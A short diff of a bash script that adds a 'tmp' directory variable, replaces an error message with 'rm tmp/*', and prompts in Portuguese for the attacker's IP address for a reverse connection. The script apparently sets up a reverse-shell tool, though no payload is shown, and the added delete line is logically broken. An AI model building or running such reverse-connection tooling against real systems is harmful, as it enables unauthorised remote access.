@@ -8,10 +8,11 @@ echo "########################################"
 
 echo ""
 
+dir="tmp"
 if [[ ! -e $dir ]]; then
     mkdir $dir
 elif [[ ! -d $dir ]]; then
-    echo "$dir already exists but is not a directory" 1>&2
+    rm tmp/*
 fi
 
 read -p "Insira o endereço do atacante para conexao reversa [192.168.25.9]: " ip
